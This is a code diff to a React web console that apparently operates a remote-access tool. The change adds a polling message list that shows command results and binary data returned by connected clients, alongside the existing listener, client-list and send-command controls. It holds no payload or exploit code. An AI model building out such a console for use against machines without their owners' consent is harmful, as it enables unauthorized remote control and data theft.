@@ -25,6 +25,11 @@
         .online { background: #28a745; }
         .offline { background: #dc3545; }
         .command-output { background: #1e1e1e; color: #00ff00; padding: 10px; border-radius: 4px; font-family: monospace; margin: 10px 0; max-height: 200px; overflow-y: auto; }
+        .message-list { max-height: 400px; overflow-y: auto; border: 1px solid #ddd; border-radius: 4px; padding: 10px; margin-top: 10px; }
+        .message-item { padding: 8px; margin: 5px 0; background: #f8f9fa; border-radius: 3px; border-left: 4px solid #007acc; }
+        .message-header { display: flex; justify-content: space-between; font-size: 0.9em; margin-bottom: 5px; }
+        .message-time { color: #666; font-size: 0.8em; }
+        .message-content { font-family: monospace; white-space: pre-wrap; background: white; padding: 5px; border-radius: 2px; }
     </style>
 </head>
 <body>
@@ -38,7 +43,7 @@
             const [command, setCommand] = React.useState('');
             const [selectedFile, setSelectedFile] = React.useState(null);
             const [clientInfo, setClientInfo] = React.useState(null);
-            const [commandOutput, setCommandOutput] = React.useState('');
+            const [clientMessages, setClientMessages] = React.useState([]);
             
             const startListener = async () => {
                 try {
@@ -78,6 +83,17 @@
                 }
             };
             
+            const fetchClientMessages = async (clientIP) => {
+                try {
+                    const result = await fetch(`http://localhost:8080/get-client-messages?client=${clientIP}`);
+                    const data = await result.json();
+                    setClientMessages(data.messages || []);
+                } catch (error) {
+                    console.error('Error fetching messages:', error);
+                    setClientMessages([]);
+                }
+            };
+            
             const sendCommand = async () => {
                 if (!selectedClient || !command) return;
                 
@@ -94,10 +110,10 @@
                     setStatus(data.status);
                     setCommand('');
                     
-                    // Simulate command output (in real implementation, this would come from server)
-                    setTimeout(() => {
-                        setCommandOutput(`Command sent: ${command}\nWaiting for response from client...`);
-                    }, 1000);
+                    // Clear previous messages and wait for real response
+                    setClientMessages([]);
+                    setStatus('✅ Command sent - waiting for response...');
+                    
                 } catch (error) {
                     setStatus('Error: ' + error.message);
                 }
@@ -131,6 +147,13 @@
             const handleClientSelect = (clientIP) => {
                 setSelectedClient(clientIP);
                 getClientInfo(clientIP);
+                fetchClientMessages(clientIP);
+            };
+            
+            const refreshMessages = async () => {
+                if (selectedClient) {
+                    await fetchClientMessages(selectedClient);
+                }
             };
             
             const getStatusClass = () => {
@@ -145,12 +168,25 @@
                 return date.toLocaleString();
             };
             
+            const formatMessageTime = (timestamp) => {
+                const date = new Date(timestamp);
+                return date.toLocaleTimeString();
+            };
+            
             // Auto-refresh clients every 5 seconds
             React.useEffect(() => {
                 refreshClients();
-                const interval = setInterval(refreshClients, 5000);
-                return () => clearInterval(interval);
+                const clientInterval = setInterval(refreshClients, 5000);
+                return () => clearInterval(clientInterval);
             }, []);
+            
+            // Auto-refresh messages for selected client every 2 seconds
+            React.useEffect(() => {
+                if (selectedClient) {
+                    const messageInterval = setInterval(refreshMessages, 2000);
+                    return () => clearInterval(messageInterval);
+                }
+            }, [selectedClient]);
             
             return (
                 <div className="container">
@@ -207,6 +243,30 @@
                                     <div>OS: {clientInfo.OS || 'Unknown'} {clientInfo.Arch || ''}</div>
                                 </div>
                             )}
+                            
+                            <div style={{marginTop: '15px'}}>
+                                <h4>📨 Client Messages:</h4>
+                                <button onClick={refreshMessages}>Refresh Messages</button>
+                                <div className="message-list">
+                                    {clientMessages.length === 0 ? (
+                                        <p>No messages yet. Send a command to see results.</p>
+                                    ) : (
+                                        clientMessages.map((msg, index) => (
+                                            <div key={index} className="message-item">
+                                                <div className="message-header">
+                                                    <strong>{msg.type}</strong> 
+                                                    <span className="message-time">
+                                                        {formatMessageTime(msg.timestamp)}
+                                                    </span>
+                                                </div>
+                                                <div className="message-content">
+                                                    {msg.content || `Binary data: ${msg.data_size} bytes`}
+                                                </div>
+                                            </div>
+                                        ))
+                                    )}
+                                </div>
+                            </div>
                         </div>
                     )}
                     
@@ -234,12 +294,6 @@
                         <button onClick={sendCommand} disabled={!selectedClient || !command}>
                             Send Command
                         </button>
-                        
-                        {commandOutput && (
-                            <div className="command-output">
-                                {commandOutput}
-                            </div>
-                        )}
                     </div>
                     
                     <div className="section">
